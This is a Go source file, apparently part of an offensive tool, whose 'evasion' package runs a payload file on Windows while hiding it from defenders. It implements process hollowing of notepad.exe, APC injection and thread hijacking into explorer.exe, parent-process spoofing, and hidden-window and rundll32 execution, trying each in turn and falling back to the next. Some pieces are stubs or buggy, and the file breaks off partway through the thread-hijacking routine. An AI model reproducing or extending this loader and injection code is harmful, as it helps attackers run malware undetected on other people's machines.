//go:build windows

package evasion

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"unsafe"

	"syscall"

	"golang.org/x/sys/windows"
)

func init() {
	// Change this function when Windows starts
	newWindowsEvasion = func(options Options) (Evasion, error) {
		return &WindowsEvasion{
			options: options,
		}, nil
	}
}

// PROC_THREAD_ATTRIBUTE_LIST structure
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  [1]uint64
}

// WindowsEvasion, applies evasion techniques for Windows
type WindowsEvasion struct {
	options Options
}

// ExecutePayload, executes the payload using evasion techniques
func (e *WindowsEvasion) ExecutePayload(filePath string) error {
	fmt.Println("[+] Advanced evasion techniques are being used...")

	// Read the file
	payload, err := ReadPayload(filePath)
	if err != nil {
		return fmt.Errorf("payload reading error: %v", err)
	}

	// Try advanced techniques
	var advancedError error
	if e.options.Method == "" {
		// Automatic method selection - try all methods
		methods := []struct {
			name   string
			method func([]byte) error
		}{
			{"Process Hollowing", e.processHollowing},
			{"Thread Hijacking", e.threadHijacking},
			{"APC Injection", e.apcInjection},
			{"Memory Execution", e.memoryExecution},
			{"Reflective Loading", e.reflectiveLoading},
		}

		// Try each method
		for _, m := range methods {
			fmt.Printf("[*] %s technique is being tested...\n", m.name)
			err := m.method(payload)
			if err == nil {
				fmt.Printf("[+] %s technique applied successfully!\n", m.name)
				return nil
			}
			fmt.Printf("[!] %s technique failed: %v\n", m.name, err)
		}

		// If no advanced techniques worked, use the reliable backup method
		advancedError = fmt.Errorf("all advanced techniques failed")
	} else {
		// If the user selected a specific method
		switch e.options.Method {
		case WEM1:
			fmt.Println("[+] WEM1: PPID Spoofing + Process Hollowing technique is being used...")
			advancedError = e.processHollowing(payload)
		case WEM2:
			fmt.Println("[+] WEM2: Memory Execution technique is being used...")
			advancedError = e.memoryExecution(payload)
		case WEM3:
			fmt.Println("[+] WEM3: APC Injection technique is being used...")
			advancedError = e.apcInjection(payload)
		case WEM4:
			fmt.Println("[+] WEM4: Thread Hijacking technique is being used...")
			advancedError = e.threadHijacking(payload)
		case WEM5:
			fmt.Println("[+] WEM5: Reflective Loading technique is being used...")
			advancedError = e.reflectiveLoading(payload)
		default:
			return fmt.Errorf("unsupported evasion method: %s", e.options.Method)
		}
	}

	// If advanced techniques failed, use the reliable backup method
	if advancedError != nil {
		fmt.Printf("[!] Special evasion techniques failed: %v\n", advancedError)
		fmt.Println("[*] Using reliable backup method...")
		return e.reliableExecution(filePath, payload)
	}

	return nil
}

// Reliable backup method - try multiple techniques
func (e *WindowsEvasion) reliableExecution(filePath string, payload []byte) error {
	// 1. method: CreateProcess + PPID Spoofing (if permission)
	err := e.createProcessWithSpoofing(filePath)
	if err == nil {
		fmt.Printf("[+] File executed successfully (PPID Spoofing): %s\n", filePath)
		return nil
	}
	fmt.Printf("[!] PPID Spoofing failed: %v\n", err)

	// 2. method: ShellExecute (hidden window)
	err = e.shellExecuteHidden(filePath)
	if err == nil {
		fmt.Printf("[+] File executed successfully (ShellExecute): %s\n", filePath)
		return nil
	}
	fmt.Printf("[!] ShellExecute failed: %v\n", err)

	// 3. method: Simple exec.Command
	cmd := exec.Command(filePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	err = cmd.Start()
	if err == nil {
		fmt.Printf("[+] File executed successfully (exec.Command): %s\n", filePath)
		return nil
	}
	fmt.Printf("[!] exec.Command failed: %v\n", err)

	// 4. method: rundll32
	rundll32Path := filepath.Join(os.Getenv("SystemRoot"), "System32", "rundll32.exe")
	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_%d.dll", os.Getpid()))

	// Save as DLL (this is just a test, not a real DLL)
	err = os.WriteFile(tempFile, payload, 0755)
	if err == nil {
		defer os.Remove(tempFile)
		cmd := exec.Command(rundll32Path, tempFile, "DllMain")
		err = cmd.Start()
		if err == nil {
			fmt.Printf("[+] File executed successfully (rundll32): %s\n", filePath)
			return nil
		}
		fmt.Printf("[!] rundll32 failed: %v\n", err)
	}

	// 5. method: Last resort - normal execution
	fmt.Println("[*] Trying normal execution...")
	cmd = exec.Command(filePath)
	err = cmd.Start()
	if err == nil {
		fmt.Printf("[+] File executed successfully: %s\n", filePath)
		return nil
	}

	return fmt.Errorf("all execution methods failed: %v", err)
}

// CreateProcess + PPID Spoofing
func (e *WindowsEvasion) createProcessWithSpoofing(filePath string) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createProcessW := kernel32.NewProc("CreateProcessW")

	// Parent process name
	parentProcessName := e.options.ParentProcess
	if parentProcessName == "" {
		parentProcessName = "explorer.exe"
	}

	// Get parent process PID
	parentPID, err := findProcessIDByName(parentProcessName)
	if err != nil {
		return err
	}

	// Open parent process
	hParentProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, parentPID)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hParentProcess)

	// STARTUPINFOEX structure
	type STARTUPINFOEX struct {
		windows.StartupInfo
		AttributeList *PROC_THREAD_ATTRIBUTE_LIST
	}

	// Get attribute list size
	var size uintptr
	initializeProcThreadAttributeList := kernel32.NewProc("InitializeProcThreadAttributeList")
	updateProcThreadAttribute := kernel32.NewProc("UpdateProcThreadAttribute")

	initializeProcThreadAttributeList.Call(
		0,
		1,
		0,
		uintptr(unsafe.Pointer(&size)),
	)
	attributeList := make([]byte, size)

	var startupInfoEx STARTUPINFOEX
	startupInfoEx.AttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&attributeList[0]))

	// Initialize attribute list
	initializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(startupInfoEx.AttributeList)),
		1,
		0,
		uintptr(unsafe.Pointer(&size)),
	)

	// Add parent process attribute
	updateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(startupInfoEx.AttributeList)),
		0,
		windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&hParentProcess)),
		unsafe.Sizeof(hParentProcess),
		0,
		0,
	)

	// Process information
	var processInfo windows.ProcessInformation

	// Create process
	startupInfoEx.Flags = windows.STARTF_USESHOWWINDOW
	startupInfoEx.ShowWindow = windows.SW_HIDE

	// Convert file path to UTF16 format
	filePathPtr, _ := syscall.UTF16PtrFromString(filePath)

	// CreateProcess call
	ret, _, _ := createProcessW.Call(
		0,
		uintptr(unsafe.Pointer(filePathPtr)),
		0,
		0,
		0,
		windows.CREATE_NO_WINDOW,
		0,
		0,
		uintptr(unsafe.Pointer(&startupInfoEx)),
		uintptr(unsafe.Pointer(&processInfo)),
	)

	if ret == 0 {
		return fmt.Errorf("CreateProcess failed")
	}

	// Close handles
	windows.CloseHandle(processInfo.Thread)
	windows.CloseHandle(processInfo.Process)

	// Clean up attribute list
	deleteProcThreadAttributeList := kernel32.NewProc("DeleteProcThreadAttributeList")
	deleteProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(startupInfoEx.AttributeList)),
	)

	return nil
}

// ShellExecute with hidden window
func (e *WindowsEvasion) shellExecuteHidden(filePath string) error {
	shell32 := windows.NewLazySystemDLL("shell32.dll")
	shellExecuteW := shell32.NewProc("ShellExecuteW")

	// Convert file path to UTF16 format
	filePathPtr, _ := syscall.UTF16PtrFromString(filePath)
	operationPtr, _ := syscall.UTF16PtrFromString("open")
	paramPtr, _ := syscall.UTF16PtrFromString("")
	dirPtr, _ := syscall.UTF16PtrFromString("")

	// ShellExecute call
	ret, _, _ := shellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(operationPtr)),
		uintptr(unsafe.Pointer(filePathPtr)),
		uintptr(unsafe.Pointer(paramPtr)),
		uintptr(unsafe.Pointer(dirPtr)),
		windows.SW_HIDE,
	)

	// If HINSTANCE > 32, success
	if ret <= 32 {
		return fmt.Errorf("ShellExecute failed: %d", ret)
	}

	return nil
}

// Find process ID by name
func findProcessIDByName(processName string) (uint32, error) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	process32First := kernel32.NewProc("Process32FirstW")
	process32Next := kernel32.NewProc("Process32NextW")

	// Create process snapshot
	hSnapshot, _, _ := createToolhelp32Snapshot.Call(
		0x2, // TH32CS_SNAPPROCESS
		0,
	)
	if hSnapshot == uintptr(windows.InvalidHandle) {
		return 0, fmt.Errorf("process snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(hSnapshot))

	// PROCESSENTRY32 structure
	type PROCESSENTRY32 struct {
		Size            uint32
		Usage           uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [windows.MAX_PATH]uint16
	}

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get first process
	ret, _, _ := process32First.Call(
		hSnapshot,
		uintptr(unsafe.Pointer(&pe32)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("process list failed")
	}

	// Find target process
	for {
		// Check process name
		processNameW := windows.UTF16ToString(pe32.ExeFile[:])
		if processNameW == processName {
			return pe32.ProcessID, nil
		}

		// Next process
		ret, _, _ = process32Next.Call(
			hSnapshot,
			uintptr(unsafe.Pointer(&pe32)),
		)
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("process not found: %s", processName)
}

// Process Hollowing technique
func (e *WindowsEvasion) processHollowing(payload []byte) error {
	fmt.Println("[*] Process Hollowing is being applied...")

	// Analyze PE file
	peFile, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("PE file analysis failed: %v", err)
	}

	// Get PE information
	var imageSize uint32
	var entryPoint uintptr
	var imageBase uint64

	if oh64, ok := peFile.OptionalHeader.(*pe.OptionalHeader64); ok {
		imageSize = oh64.SizeOfImage
		entryPoint = uintptr(oh64.AddressOfEntryPoint)
		imageBase = oh64.ImageBase
		fmt.Printf("[*] 64-bit PE file detected (EntryPoint: 0x%X, ImageBase: 0x%X)\n", entryPoint, imageBase)
	} else if oh32, ok := peFile.OptionalHeader.(*pe.OptionalHeader32); ok {
		imageSize = oh32.SizeOfImage
		entryPoint = uintptr(oh32.AddressOfEntryPoint)
		imageBase = uint64(oh32.ImageBase)
		fmt.Printf("[*] 32-bit PE file detected (EntryPoint: 0x%X, ImageBase: 0x%X)\n", entryPoint, imageBase)
	} else {
		return fmt.Errorf("unsupported PE format")
	}

	// Select target process
	targetProcess := "C:\\Windows\\System32\\notepad.exe" // Default

	// If user specified a specific target, use it
	if e.options.TargetProcess != "" {
		targetProcess = e.options.TargetProcess
	}

	fmt.Printf("[*] Target process: %s\n", targetProcess)

	// Create StartupInfo and ProcessInformation
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	// Create target process (suspended)
	err = windows.CreateProcess(
		nil,
		windows.StringToUTF16Ptr(targetProcess),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return fmt.Errorf("process creation failed: %v", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	fmt.Printf("[+] Target process created (PID: %d)\n", pi.ProcessId)

	// Get thread context
	type CONTEXT struct {
		P1Home       uint64
		P2Home       uint64
		P3Home       uint64
		P4Home       uint64
		P5Home       uint64
		P6Home       uint64
		ContextFlags uint32
		MxCsr        uint32
		SegCs        uint16
		SegDs        uint16
		SegEs        uint16
		SegFs        uint16
		SegGs        uint16
		SegSs        uint16
		EFlags       uint32
		Dr0          uint64
		Dr1          uint64
		Dr2          uint64
		Dr3          uint64
		Dr6          uint64
		Dr7          uint64
		Rax          uint64
		Rcx          uint64
		Rdx          uint64
		Rbx          uint64
		Rsp          uint64
		Rbp          uint64
		Rsi          uint64
		Rdi          uint64
		R8           uint64
		R9           uint64
		R10          uint64
		R11          uint64
		R12          uint64
		R13          uint64
		R14          uint64
		R15          uint64
		Rip          uint64
	}

	var ctx CONTEXT
	ctx.ContextFlags = 0x10007 // CONTEXT_FULL

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	getThreadContext := kernel32.NewProc("GetThreadContext")
	_, _, err = getThreadContext.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if err != syscall.Errno(0) {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("thread context failed: %v", err)
	}

	// Get PEB address
	pebAddress := uintptr(ctx.Rdx)

	// Clean up process memory
	zwUnmapViewOfSection := ntdll.NewProc("ZwUnmapViewOfSection")
	_, _, err = zwUnmapViewOfSection.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
	)
	fmt.Printf("[+] Process memory cleaned up (BaseAddress: 0x%X)\n", imageBase)

	// Allocate new memory
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	newImageBase, _, err := virtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(imageSize),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if newImageBase == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("memory allocation failed: %v", err)
	}
	fmt.Printf("[+] Memory allocated: 0x%X (Size: %d bytes)\n", newImageBase, imageSize)

	// Write PE header
	var headerSize uint32
	if oh64, ok := peFile.OptionalHeader.(*pe.OptionalHeader64); ok {
		headerSize = oh64.SizeOfHeaders
	} else if oh32, ok := peFile.OptionalHeader.(*pe.OptionalHeader32); ok {
		headerSize = oh32.SizeOfHeaders
	}

	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	var bytesWritten uintptr
	_, _, err = writeProcessMemory.Call(
		uintptr(pi.Process),
		newImageBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(headerSize),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if err != syscall.Errno(0) {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("header write failed: %v", err)
	}
	fmt.Printf("[+] PE Header written (Size: %d bytes)\n", bytesWritten)

	// Write sections
	for _, section := range peFile.Sections {
		sectionData, err := section.Data()
		if err != nil {
			continue
		}

		sectionAddr := newImageBase + uintptr(section.VirtualAddress)
		_, _, err = writeProcessMemory.Call(
			uintptr(pi.Process),
			sectionAddr,
			uintptr(unsafe.Pointer(&sectionData[0])),
			uintptr(len(sectionData)),
			uintptr(unsafe.Pointer(&bytesWritten)),
		)
		fmt.Printf("[+] Section written: %s (VA: 0x%X, Size: %d bytes)\n",
			section.Name, section.VirtualAddress, bytesWritten)
	}

	// Update ImageBaseAddress in PEB
	_, _, err = writeProcessMemory.Call(
		uintptr(pi.Process),
		pebAddress+16,
		uintptr(unsafe.Pointer(&newImageBase)),
		unsafe.Sizeof(newImageBase),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if err != syscall.Errno(0) {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("PEB update failed: %v", err)
	}

	// Set entry point
	ctx.Rip = uint64(newImageBase + entryPoint)
	fmt.Printf("[+] Entry point set: 0x%X\n", ctx.Rip)

	// Update thread context
	setThreadContext := kernel32.NewProc("SetThreadContext")
	_, _, err = setThreadContext.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if err != syscall.Errno(0) {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("thread context update failed: %v", err)
	}

	// Resume thread
	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("thread resume failed: %v", err)
	}

	fmt.Println("[+] Process Hollowing applied successfully")
	return nil
}

// PPID Spoofing technique (separately)
func (e *WindowsEvasion) ppidSpoofing(payload []byte) error {
	fmt.Println("[*] PPID Spoofing is being applied...")

	// This function will be applied later

	return fmt.Errorf("PPID Spoofing is not yet applied")
}

// findExecutablePath finds the full path of the given file name
func findExecutablePath(fileName string) (string, error) {
	// First, search in Windows/System32 folder
	systemDir, err := windows.GetSystemDirectory()
	if err == nil {
		path := filepath.Join(systemDir, fileName)
		if _, err := os.Stat(path); err == nil {
			return path, nil
		}
	}

	// Search in PATH
	path, err := exec.LookPath(fileName)
	if err == nil {
		return path, nil
	}

	return "", fmt.Errorf("file not found: %s", fileName)
}

// WEM2: Memory Execution technique
func (e *WindowsEvasion) memoryExecution(payload []byte) error {
	fmt.Println("[*] Memory Execution is being applied...")

	// Copy file to temporary location
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, fmt.Sprintf("temp_%d.exe", os.Getpid()))

	err := os.WriteFile(tempFile, payload, 0755)
	if err != nil {
		return fmt.Errorf("temporary file creation failed: %v", err)
	}
	defer os.Remove(tempFile) // Delete file after process ends

	// Run the file
	cmd := exec.Command(tempFile)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true, // Hide window
	}

	return cmd.Start()
}

// WEM3: APC Injection technique
func (e *WindowsEvasion) apcInjection(payload []byte) error {
	fmt.Println("[*] APC Injection is being applied...")

	// 1. Convert PE file to shellcode
	shellcode, err := convertPEToShellcode(payload)
	if err != nil {
		// If conversion fails, use alternative approach
		fmt.Println("[!] PE file cannot be converted to shellcode, using alternative approach...")
		return e.alternativeExecution(payload)
	}

	// Load required DLLs
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	//ntdll := windows.NewLazySystemDLL("ntdll.dll")

	// Get required functions
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	openProcess := kernel32.NewProc("OpenProcess")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	openThread := kernel32.NewProc("OpenThread")
	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	process32First := kernel32.NewProc("Process32FirstW")
	process32Next := kernel32.NewProc("Process32NextW")
	thread32First := kernel32.NewProc("Thread32First")
	thread32Next := kernel32.NewProc("Thread32Next")

	// Target process name
	targetProcessName := "explorer.exe" // Default
	if e.options.TargetProcess != "" {
		targetProcessName = e.options.TargetProcess
	}

	fmt.Printf("[*] Target process: %s\n", targetProcessName)

	// Take process snapshot
	hSnapshot, _, _ := createToolhelp32Snapshot.Call(
		0x2, // TH32CS_SNAPPROCESS
		0,
	)
	if hSnapshot == uintptr(windows.InvalidHandle) {
		return fmt.Errorf("process snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(hSnapshot))

	// PROCESSENTRY32 structure
	type PROCESSENTRY32 struct {
		Size            uint32
		Usage           uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [windows.MAX_PATH]uint16
	}

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get first process
	ret, _, _ := process32First.Call(
		hSnapshot,
		uintptr(unsafe.Pointer(&pe32)),
	)
	if ret == 0 {
		return fmt.Errorf("process list failed")
	}

	// Find target process
	var targetPID uint32
	targetFound := false

	for {
		// Check process name
		processName := windows.UTF16ToString(pe32.ExeFile[:])
		if processName == targetProcessName {
			targetPID = pe32.ProcessID
			targetFound = true
			fmt.Printf("[+] Target process found: %s (PID: %d)\n", processName, targetPID)
			break
		}

		// Next process
		ret, _, _ = process32Next.Call(
			hSnapshot,
			uintptr(unsafe.Pointer(&pe32)),
		)
		if ret == 0 {
			break
		}
	}

	if !targetFound {
		return fmt.Errorf("target process not found: %s", targetProcessName)
	}

	// Open target process
	hProcess, _, _ := openProcess.Call(
		0x1F0FFF, // PROCESS_ALL_ACCESS
		0,
		uintptr(targetPID),
	)
	if hProcess == 0 {
		return fmt.Errorf("process open failed")
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	// Allocate memory in target process
	addr, _, _ := virtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		return fmt.Errorf("memory allocation failed")
	}

	fmt.Printf("[+] Memory allocated: 0x%X (Size: %d bytes)\n", addr, len(shellcode))

	// Write shellcode to memory
	var bytesWritten uintptr
	_, _, _ = writeProcessMemory.Call(
		hProcess,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if bytesWritten != uintptr(len(shellcode)) {
		return fmt.Errorf("memory write failed")
	}

	fmt.Printf("[+] Payload written to memory (Written: %d bytes)\n", bytesWritten)

	// Take thread snapshot
	hThreadSnapshot, _, _ := createToolhelp32Snapshot.Call(
		0x4, // TH32CS_SNAPTHREAD
		0,
	)
	if hThreadSnapshot == uintptr(windows.InvalidHandle) {
		return fmt.Errorf("thread snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(hThreadSnapshot))

	// THREADENTRY32 structure
	type THREADENTRY32 struct {
		Size           uint32
		Usage          uint32
		ThreadID       uint32
		OwnerProcessID uint32
		BasePri        int32
		DeltaPri       int32
		Flags          uint32
	}

	var te32 THREADENTRY32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Get first thread
	ret, _, _ = thread32First.Call(
		hThreadSnapshot,
		uintptr(unsafe.Pointer(&te32)),
	)
	if ret == 0 {
		return fmt.Errorf("thread list failed")
	}

	// Find target process threads and add APC
	apcQueued := false
	for {
		// Check thread process ID
		if te32.OwnerProcessID == targetPID {
			// Open thread
			hThread, _, _ := openThread.Call(
				0x1FFFFF, // THREAD_ALL_ACCESS
				0,
				uintptr(te32.ThreadID),
			)
			if hThread != 0 {
				// Add APC
				_, _, _ = queueUserAPC.Call(
					addr,
					hThread,
					0,
				)

				windows.CloseHandle(windows.Handle(hThread))
				apcQueued = true
				fmt.Printf("[+] APC added to queue (Thread ID: %d)\n", te32.ThreadID)
			}
		}

		// Next thread
		ret, _, _ = thread32Next.Call(
			hThreadSnapshot,
			uintptr(unsafe.Pointer(&te32)),
		)
		if ret == 0 {
			break
		}
	}

	if !apcQueued {
		return fmt.Errorf("no thread could be added to APC")
	}

	fmt.Println("[+] APC Injection applied successfully")
	fmt.Println("[*] NOTE: The thread must be in alertable state for APC to work")
	return nil
}

// Alternative execution method - Using WEM2
func (e *WindowsEvasion) alternativeExecution(payload []byte) error {
	fmt.Println("[*] Using alternative execution method (WEM2)...")

	// Copy file to temporary location
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, fmt.Sprintf("temp_%d.exe", os.Getpid()))

	err := os.WriteFile(tempFile, payload, 0755)
	if err != nil {
		return fmt.Errorf("temporary file creation failed: %v", err)
	}
	defer os.Remove(tempFile) // Delete file after process ends

	// Run the file
	cmd := exec.Command(tempFile)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true, // Hide window
	}

	return cmd.Start()
}

// PE to shellcode function (simplified)
func convertPEToShellcode(peData []byte) ([]byte, error) {
	// This function should be a real PE -> Shellcode converter
	// As a simple example, a tool like dobox or sRDI can be used

	// NOTE: This is not a real converter, it's just an example
	// For a real implementation, integrate tools like dobox or sRDI

	return nil, fmt.Errorf("conversion function not yet implemented")
}

// WEM4: Thread Hijacking technique
func (e *WindowsEvasion) threadHijacking(payload []byte) error {
	fmt.Println("[*] Thread Hijacking is being applied...")

	// Load required DLLs
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	// Get required functions
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	createToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	//process32First := kernel32.NewProc("Process32FirstW")
	//process32Next := kernel32.NewProc("Process32NextW")
	thread32First := kernel32.NewProc("Thread32First")
	thread32Next := kernel32.NewProc("Thread32Next")
	openThread := kernel32.NewProc("OpenThread")
	suspendThread := kernel32.NewProc("SuspendThread")
	getThreadContext := kernel32.NewProc("GetThreadContext")
	setThreadContext := kernel32.NewProc("SetThreadContext")
	resumeThread := kernel32.NewProc("ResumeThread")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	openProcess := kernel32.NewProc("OpenProcess")
	ntQueryInformationThread := ntdll.NewProc("NtQueryInformationThread")

	// 1. Allocate memory (RWX)
	addr, _, _ := virtualAlloc.Call(
		0,
		uintptr(len(payload)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)

	if addr == 0 {
		return fmt.Errorf("memory allocation failed")
	}

	fmt.Printf("[+] Memory allocated: 0x%X (Size: %d bytes)\n", addr, len(payload))

	// 2. Copy payload to memory
	copyMemory(unsafe.Pointer(addr), payload)
	fmt.Println("[+] Payload written to memory")

	// 3. Determine target process name
	targetProcess := e.options.TargetProcess
	if targetProcess == "" {
		targetProcess = "explorer.exe"
	}

	fmt.Printf("[*] Target process: %s\n", targetProcess)

	// 4. Find target process PID
	targetPID, err := findProcessIDByName(targetProcess)
	if err != nil {
		return fmt.Errorf("target process not found: %v", err)
	}

	fmt.Printf("[+] Target process found: %s (PID: %d)\n", targetProcess, targetPID)

	// 5. Open target process
	hProcess, _, _ := openProcess.Call(
		uintptr(windows.PROCESS_ALL_ACCESS),
		0,
		uintptr(targetPID),
	)

	if hProcess == 0 {
		return fmt.Errorf("process not found")
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	// 6. Allocate memory in target process
	remoteAddr, _, _ := virtualAlloc.Call(
		hProcess,
		0,
		uintptr(len(payload)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)

	if remoteAddr == 0 {
		return fmt.Errorf("memory allocation failed in target process")
	}

	fmt.Printf("[+] Memory allocated in target process: 0x%X\n", remoteAddr)

	// 7. Write payload to target process memory
	var bytesWritten uintptr
	_, _, _ = writeProcessMemory.Call(
		hProcess,
		remoteAddr,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if bytesWritten != uintptr(len(payload)) {
		return fmt.Errorf("memory write failed")
	}

	fmt.Printf("[+] Payload written to target process memory (Written: %d bytes)\n", bytesWritten)

	// 8. Take thread snapshot
	hSnapshot, _, _ := createToolhelp32Snapshot.Call(
		uintptr(0x4), // TH32CS_SNAPTHREAD
		0,
	)
	if hSnapshot == uintptr(windows.InvalidHandle) {
		return fmt.Errorf("thread snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(hSnapshot))

	// THREADENTRY32 structure
	type THREADENTRY32 struct {
		Size           uint32
		Usage          uint32
		ThreadID       uint32
		OwnerProcessID uint32
		BasePri        int32
		DeltaPri       int32
		Flags          uint32
	}

	var te32 THREADENTRY32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// 9. Get first thread
	ret, _, _ := thread32First.Call(
		hSnapshot,
		uintptr(unsafe.Pointer(&te32)),
	)
	if ret == 0 {
		return fmt.Errorf("thread list failed")
	}

	type M128A struct {
		Low  uint64
		High int64
	}

	// CONTEXT structure (x64)
	type XMM_SAVE_AREA32 struct {
		ControlWord    uint16
		StatusWord     uint16
		TagWord        uint8
		Reserved1      uint8
		ErrorOpcode    uint16
		ErrorOffset    uint32
		ErrorSelector  uint16
		Reserved2      uint16
		DataOffset     uint32
		DataSelector   uint16
		Reserved3      uint16
		MxCsr          uint32
		MxCsr_Mask     uint32
		FloatRegisters [8]M128A
		XmmRegisters   [16]M128A
		Reserved4      [96]byte
	}

	type CONTEXT struct {
		P1Home               uint64
		P2Home               uint64
		P3Home               uint64
		P4Home               uint64
		P5Home               uint64
		P6Home               uint64
		ContextFlags         uint32
		MxCsr                uint32
		SegCs                uint16
		SegDs                uint16
		SegEs                uint16
		SegFs                uint16
		SegGs                uint16
		SegSs                uint16
		EFlags               uint32
		Dr0                  uint64
		Dr1                  uint64
		Dr2                  uint64
		Dr3                  uint64
		Dr6                  uint64
		Dr7                  uint64
		Rax                  uint64
		Rcx                  uint64
		Rdx                  uint64
		Rbx                  uint64
		Rsp                  uint64
		Rbp                  uint64
		Rsi                  uint64
		Rdi                  uint64
		R8                   uint64
		R9                   uint64
		R10                  uint64
		R11                  uint64
		R12                  uint64
		R13                  uint64
		R14                  uint64
		R15                  uint64
		Rip                  uint64
		FltSave              XMM_SAVE_AREA32
		VectorRegister       [26]M128A
		VectorControl        uint64
		DebugControl         uint64
		LastBranchToRip      uint64
		LastBranchFromRip    uint64
		LastExceptionToRip   uint64
		LastExceptionFromRip uint64
	}

	// 10. Find target process threads and hijack them
	threadHijacked := false
	for {
		if te32.OwnerProcessID == targetPID {
			// Check thread status
			hThread, _, _ := openThread.Call(
				uintptr(windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME),
				0,
				uintptr(te32.ThreadID),
			)

			if hThread != 0 {
				// Check thread execution mode (is it in user mode?)
				type THREAD_BASIC_INFORMATION struct {
					ExitStatus     int32
					TebBaseAddress uintptr
					ClientId       struct {
						UniqueProcess uintptr
						UniqueThread  uintptr
					}
					AffinityMask uintptr
					Priority     int32
					BasePriority int32
				}

				var tbi THREAD_BASIC_INFORMATION
				var returnLength uint32

				_, _, _ = ntQueryInformationThread.Call(
					hThread,
					0, // ThreadBasicInformation
					uintptr(unsafe.Pointer(&tbi)),
					uintptr(unsafe.Sizeof(tbi)),
					uintptr(unsafe.Pointer(&returnLength)),
